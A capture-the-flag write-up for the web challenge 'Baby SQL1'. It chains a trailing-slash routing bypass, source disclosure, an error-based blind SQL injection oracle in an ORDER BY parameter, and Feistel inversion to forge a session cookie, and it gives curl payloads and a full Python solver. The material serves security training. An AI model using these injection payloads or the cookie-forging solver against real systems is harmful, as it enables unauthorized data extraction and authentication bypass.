---
title: "Baby SQL1"
ctf: "CSCV2026"
date: 2026-10-16
category: "web"
difficulty: "hard"
points: 458
flag_format: "CSCV2026{...}"
author: "datnix"
---

# Baby SQL1

## Result

REMOTE_CONFIRMED

Flag:

~~~text
CSCV2026{R3g3xp_oRaC13_th3N_f0rg3_7he_5es510n}
~~~

The reproduction below was run against the working instance:

~~~text
https://web04-640e9ed6333b.59.153.245.188.sslip.io
~~~

## Browser evidence

The browser evidence is stored in evidence/playwright/:

![Landing page](/evidence/cscv2026/web01/01-landing.png)

![Source disclosure](/evidence/cscv2026/web01/02-source-disclosure.png)

![Invoice search page](/evidence/cscv2026/web01/03-invoice-page.png)

![True branch: HTTP 500](/evidence/cscv2026/web01/04-oracle-true-500.png)

![False branch: HTTP 200](/evidence/cscv2026/web01/05-oracle-false-200.png)

![Flag returned by debug.php](/evidence/cscv2026/web01/06-flag.png)

The final browser snapshot contained exactly:

~~~text
CSCV2026{R3g3xp_oRaC13_th3N_f0rg3_7he_5es510n}
~~~

## 1. Reach the hidden PHP handlers

The landing page contains commented links to query.php and debug.php. Apache blocks the bare paths, but appending a slash reaches the PHP handlers through PATH_INFO:

~~~text
/query.php/       -> invoice search
/debug.php/       -> custom-session protected endpoint
~~~

The source-disclosure condition is:

~~~text
/debug.php/?debug=true
~~~

The disclosed source reveals:

~~~text
SESSION_SEED = 1a2b3czzPk
PERMUTATION_ROUNDS = 24
cookie = CUSTOM_SESSION
database identity = SELECT CURRENT_USER
flag output = FLAG environment variable
~~~

The key ordering detail is that debug.php obtains CURRENT_USER before validating the cookie. Therefore a database failure produces 500 before any candidate cookie can be accepted.

## 2. Investigation log: identifying the vulnerability

The final exploit is short, but it was not obvious at the beginning. The important part was to treat each observation as a hypothesis test instead of assuming that the challenge must immediately be SQLi.

### Hypothesis A: the hidden handlers are simply unavailable

The first requests produced different behavior depending on the path:

~~~text
/query.php       -> Apache 403
/query.php/      -> application response
/debug.php       -> Apache 403
/debug.php/      -> application response
~~~

The trailing slash was therefore tested as a path-normalization boundary. This was the first confirmed routing bug, and it exposed the actual challenge handlers.

### Hypothesis B: the database is broken, not exploitable

Some issued instances returned:

~~~text
/query.php/ -> 500
/debug.php/ -> 500
~~~

The disclosed debug source showed that debug.php calls SELECT CURRENT_USER before checking CUSTOM_SESSION. Because both database-dependent endpoints failed, these instances were classified as broken infrastructure rather than as an SQLi oracle. Brute-forcing usernames or cookies against them could not succeed: every candidate failed before validation.

The working instance behaved differently:

~~~text
/query.php/ -> 200 invoice page
/debug.php/ with an invalid cookie -> 401
~~~

That control proved that the database was alive and that further SQL experiments were meaningful.

### Hypothesis C: the search field is injectable

The invoice page was tested one parameter at a time. Quote characters and common boolean suffixes in the search field changed whether rows were returned, but did not produce a stable true/false distinction. POST requests also behaved differently from the normal GET form flow.

Conclusion: the search parameter was not yet a useful extraction channel. It was not treated as proof that the whole application was safe; the next input was tested instead.

### Hypothesis D: the sort field reaches SQL

The order parameter accepted ordinary sort values and some SQL expressions. Other expression shapes—such as comma-separated ordering, subqueries, or unsupported functions—caused a fast 500. This suggested that the value was reaching an SQL ORDER BY context, with errors exposed by the application.

At first, changing the sort order appeared useless because the database returned only one visible invoice. That ruled out a visual ordering oracle, but not an error or status oracle.

The initial probes were sent as URL-encoded GET parameters:

~~~bash
BASE='https://web04-640e9ed6333b.59.153.245.188.sslip.io'

# Normal controls
curl -ksS -G -o /tmp/r -w 'name: %{http_code} %{size_download}\n' \
  --data-urlencode 'order=name ASC' "$BASE/query.php/"
curl -ksS -G -o /tmp/r -w 'one:  %{http_code} %{size_download}\n' \
  --data-urlencode 'order=1' "$BASE/query.php/"

# Syntax and context probes
curl -ksS -G -o /tmp/r -w 'comma:    %{http_code} %{size_download}\n' \
  --data-urlencode 'order=1,2' "$BASE/query.php/"
curl -ksS -G -o /tmp/r -w 'subquery: %{http_code} %{size_download}\n' \
  --data-urlencode 'order=(SELECT 1)' "$BASE/query.php/"
curl -ksS -G -o /tmp/r -w 'case:     %{http_code} %{size_download}\n' \
  --data-urlencode 'order=CASE WHEN 1=1 THEN 1 ELSE 2 END' "$BASE/query.php/"
~~~

The normal and simple expression probes returned the invoice page with 200. Comma-separated ordering and subqueries returned a fast 500, while a simple CASE expression was accepted. This did not prove blind SQLi by itself, but it narrowed the input to an SQL-expression context and showed that server-side SQL errors were observable.

### Hypothesis E: status is the blind channel

A controlled pair of experiments was then used:

| Experiment | Observation | Conclusion |
|---|---|---|
| Normal order expression | 200 and the invoice page | Valid baseline |
| Deliberately malformed order expression | 500 and a short error body | SQL failures are observable |
| Conditional expression with a known-true condition | 500 | The failure branch is reachable |
| Same expression with a known-false condition | 200 | The two branches are distinguishable |

The result was repeated with low request volume to rule out transient traffic. The application therefore provided a one-bit error oracle:

~~~text
HTTP 500 -> condition true
HTTP 200 -> condition false
~~~

The concrete true/false pair used in the browser evidence was:

~~~text
# True candidate: CURRENT_USER matches ^s
order=CASE WHEN CURRENT_USER REGEXP _utf8mb4 0x5e73 COLLATE utf8mb4_bin THEN name REGEXP _utf8mb4 0x5e4e677579656e282e2a297b31307d5824 ELSE 0 END
-> HTTP 500, body: Internal Server Error

# False candidate: CURRENT_USER does not match ^z
order=CASE WHEN CURRENT_USER REGEXP _utf8mb4 0x5e7a COLLATE utf8mb4_bin THEN name REGEXP _utf8mb4 0x5e4e677579656e282e2a297b31307d5824 ELSE 0 END
-> HTTP 200, normal invoice page
~~~

The same pair can be reproduced with curl:

~~~bash
TRUE='CASE WHEN CURRENT_USER REGEXP _utf8mb4 0x5e73 COLLATE utf8mb4_bin THEN name REGEXP _utf8mb4 0x5e4e677579656e282e2a297b31307d5824 ELSE 0 END'
FALSE='CASE WHEN CURRENT_USER REGEXP _utf8mb4 0x5e7a COLLATE utf8mb4_bin THEN name REGEXP _utf8mb4 0x5e4e677579656e282e2a297b31307d5824 ELSE 0 END'

curl -ksS -G -o /tmp/true -w 'true:  %{http_code} %{size_download}\n' \
  --data-urlencode "order=$TRUE" "$BASE/query.php/"
curl -ksS -G -o /tmp/false -w 'false: %{http_code} %{size_download}\n' \
  --data-urlencode "order=$FALSE" "$BASE/query.php/"
~~~

This is why 500 is useful here, rather than merely “the server is broken”:

1. A normal request establishes a stable 200 baseline.
2. A malformed SQL expression establishes that SQL failures are exposed.
3. Only the true conditional branch reaches the failure-producing expression.
4. The false branch returns the normal page.
5. Repeating both branches gives the same status split.

The response does not reveal the database value directly, but it answers one question about it. That is an error-based blind SQLi oracle. Before this paired experiment, 500 was only a symptom; after it, 500/200 was a proven extraction channel.

The source had already told us which database value mattered: CURRENT_USER. The next hypothesis was therefore not “guess a likely username,” but “ask the oracle whether CURRENT_USER matches a candidate prefix.” Character extraction was performed with anchored regular-expression predicates, one position at a time.

### Hypothesis F: the disclosed crypto is the second stage

The source disclosure revealed the seed, round count, target construction, and cookie validation. Candidate usernames produced 401 responses, which was expected because the username must be exact. Once the blind extraction returned the complete database identity, the permutation could be inverted locally and the resulting cookie could be verified against debug.php.

The complete chain was therefore:

~~~text
commented links
-> trailing-slash routing
-> source disclosure
-> database-health classification
-> injectable ORDER BY expression
-> conditional error/status oracle
-> CURRENT_USER extraction
-> local Feistel inversion
-> valid session cookie
-> flag
~~~

## 3. Use order as a blind SQLi oracle

The invoice page places the user-controlled order value into an SQL ORDER BY expression. A predicate on the database account can be turned into a status-code oracle.

Payload used for a true test:

~~~sql
CASE WHEN CURRENT_USER REGEXP _utf8mb4 0x5e73 COLLATE utf8mb4_bin
     THEN name REGEXP _utf8mb4 0x5e4e677579656e282e2a297b31307d5824
     ELSE 0 END
~~~

The hex values decode to:

~~~text
0x5e73                                  -> ^s
0x5e4e677579656e282e2a297b31307d5824    -> ^Nguyen(.*){10}X$
~~~

On this instance, the THEN expression is a failure-producing marker, so:

~~~text
HTTP 500 -> predicate true
HTTP 200 -> predicate false
~~~

For example, testing ^s produced 500; replacing it with ^z produced the normal invoice page and 200. The response body does not need to change—the status code is the blind channel.

I tested each position with an anchored prefix and escaped candidate characters. The exact account returned by the oracle was:

~~~text
svatttadm1n001@%
~~~

## 4. Invert the custom session transform

The source defines a 24-round Feistel-style permutation:

~~~text
session_target(CURRENT_USER) == forward_permutation(raw_cookie)
~~~

Because the seed and every round function are exposed, the permutation can be inverted locally. The resulting cookie for svatttadm1n001@% was:

~~~text
CUSTOM_SESSION=08b72d5b3d0ef28c5d01fc8b474883f1
~~~

Request:

~~~bash
curl -ksS \
  -H 'Cookie: CUSTOM_SESSION=08b72d5b3d0ef28c5d01fc8b474883f1' \
  'https://web04-640e9ed6333b.59.153.245.188.sslip.io/debug.php/'
~~~

The target returned the flag shown above.

## Complete solver

Save this as baby_sql1_solver.py or use the copy stored beside this writeup:

~~~python
#!/usr/bin/env python3
import argparse
import hashlib
import hmac
import re
import string
import struct
import sys
import time
from concurrent.futures import ThreadPoolExecutor

import requests
import urllib3


SEED = b"1a2b3czzPk"
BASE = "https://web04-640e9ed6333b.59.153.245.188.sslip.io"
MARKER = bytes.fromhex("5e4e677579656e282e2a297b31307d5824")
CHARS = string.ascii_letters + string.digits + "_@%.-:[]"
REGEX_META = set(r"\.^$*+?()[]{}|")


def hm(key, message):
    return hmac.new(key, message, hashlib.sha256).digest()


def regex_literal(value):
    return "".join("\\" + c if c in REGEX_META else c for c in value)


def oracle_payload(pattern):
    return (
        "CASE WHEN CURRENT_USER REGEXP _utf8mb4 0x"
        + pattern.encode().hex()
        + " COLLATE utf8mb4_bin THEN name REGEXP _utf8mb4 0x"
        + MARKER.hex()
        + " ELSE 0 END"
    )


def oracle(base, pattern):
    url = base.rstrip("/") + "/query.php/"
    for _ in range(5):
        response = requests.get(
            url,
            params={"order": oracle_payload(pattern)},
            verify=False,
            timeout=15,
        )
        if response.status_code == 500:
            return True
        if response.status_code == 200:
            return False
        if response.status_code == 429:
            time.sleep(0.75)
            continue
        raise RuntimeError(f"unexpected oracle status: {response.status_code}")
    raise RuntimeError("rate limit did not clear")


def recover_user(base):
    prefix = ""
    with ThreadPoolExecutor(max_workers=4) as pool:
        for position in range(64):
            if oracle(base, "^" + regex_literal(prefix) + "$"):
                return prefix
            jobs = {
                c: pool.submit(
                    oracle, base, "^" + regex_literal(prefix + c)
                )
                for c in CHARS
            }
            hits = [c for c, job in jobs.items() if job.result()]
            if len(hits) != 1:
                raise RuntimeError(
                    f"position {position}: expected one hit, got {hits!r}"
                )
            prefix += hits[0]
            print(f"CURRENT_USER prefix: {prefix}", flush=True)
    raise RuntimeError("CURRENT_USER is longer than 64 bytes")


def whitening(domain):
    return hm(SEED, b"SQL1/WHITEN\0" + domain.encode())[:16]


def round_mask(half, number):
    number_bytes = struct.pack(">I", number)
    key = hm(SEED, b"SQL1/ROUND-KEY\0" + number_bytes)
    return hm(
        key, b"SQL1/ROUND-DATA\0" + half + number_bytes
    )[:8]


def session_target(user):
    user_bytes = user.encode()
    payload = struct.pack(">I", len(user_bytes)) + user_bytes
    return hm(SEED, b"SQL1/TARGET\0" + payload)[:16]


def invert_forward(target):
    state = bytes(
        a ^ b for a, b in zip(target, whitening("OUTPUT"))
    )
    left, right = state[:8], state[8:]
    for number in range(23, -1, -1):
        previous_right = left
        previous_left = bytes(
            a ^ b
            for a, b in zip(
                right, round_mask(previous_right, number)
            )
        )
        left, right = previous_left, previous_right
    state = left + right
    return bytes(
        a ^ b for a, b in zip(state, whitening("INPUT"))
    )


def forge_cookie(user):
    return invert_forward(session_target(user)).hex()


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--base", default=BASE)
    parser.add_argument("--user", help="skip SQLi and use CURRENT_USER")
    args = parser.parse_args()
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    user = args.user or recover_user(args.base)
    cookie = forge_cookie(user)
    print(f"CURRENT_USER = {user}")
    print(f"CUSTOM_SESSION = {cookie}")

    response = requests.get(
        args.base.rstrip("/") + "/debug.php/",
        cookies={"CUSTOM_SESSION": cookie},
        verify=False,
        timeout=15,
    )
    print(f"/debug.php status = {response.status_code}")
    print(response.text.strip())
    match = re.search(r"CSCV2026\{[^\r\n}]+\}", response.text)
    if response.status_code != 200 or not match:
        print("flag not verified", file=sys.stderr)
        return 1
    print(f"REMOTE_CONFIRMED: {match.group(0)}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
~~~

Run:

~~~bash
python3 baby_sql1_solver.py \
  --base 'https://web04-640e9ed6333b.59.153.245.188.sslip.io'
~~~

## Why the competition attempt failed

The pasted conversation mixed several different challenge instances and therefore mixed two different failure modes.

| Instance state | Observation | Correct interpretation |
|---|---|---|
| web04-b3f... and web04-a2a... | query.php/ returned 500; debug.php/ also returned 500 even with candidate cookies | Real PDO/MySQL failure before authentication. No cookie brute force could work. |
| A healthy instance such as web04-636... | query.php/ returned the invoice page and debug.php/ returned 401 for bad cookies | Database was working; this was the point to run the blind SQLi oracle. |
| The working instance used here | query.php/ gave distinguishable 500/200 responses | The status difference was the intended extraction channel. |

The main tactical mistakes were:

1. The 500 response was classified too broadly. On a broken host, it meant the database was unavailable. On a healthy query.php/, it meant the SQL predicate was true. The endpoint had to be classified per instance and per route.

2. The oracle was expected to change visible rows or sort order. There was only one invoice, so visual ordering could not reveal anything. The useful signal was the HTTP status. The true branch deliberately caused an SQL error; the false branch returned the normal page.

3. The wrong SQL variants were emphasized. CURRENT_USER() and timing functions were rejected by some query paths. The working expression used the bare MySQL CURRENT_USER identifier, REGEXP, _utf8mb4, and COLLATE utf8mb4_bin. The exact accepted expression matters more than trying many generic SLEEP() payloads.

4. Brute-forcing usernames and cookies attacked the wrong dependency. debug.php executes SELECT CURRENT_USER before checking CUSTOM_SESSION. When that query fails, every possible token produces the same 500; brute force cannot distinguish a correct candidate.

5. The 25-minute budget was consumed by broad recon after the relevant route was known. Full SecLists scans took tens of minutes, while the successful chain needed only the source leak, the trailing-slash route, a status oracle, and local Feistel inversion. Slow polling is appropriate for a temporary service outage, but it is not a substitute for reclassifying a newly issued instance.

6. The Gemini plan stopped one step too early. Inverting the Feistel transform was correct, but it still required the exact CURRENT_USER. The SQLi extraction was the central challenge step, not optional reconnaissance.

The shortest competition decision rule would have been:

~~~text
query.php/ = invoice page, debug.php/ = 401  -> immediately extract CURRENT_USER via 500/200
query.php/ = 500, debug.php/ = 500           -> abandon that instance and request/reissue another
~~~

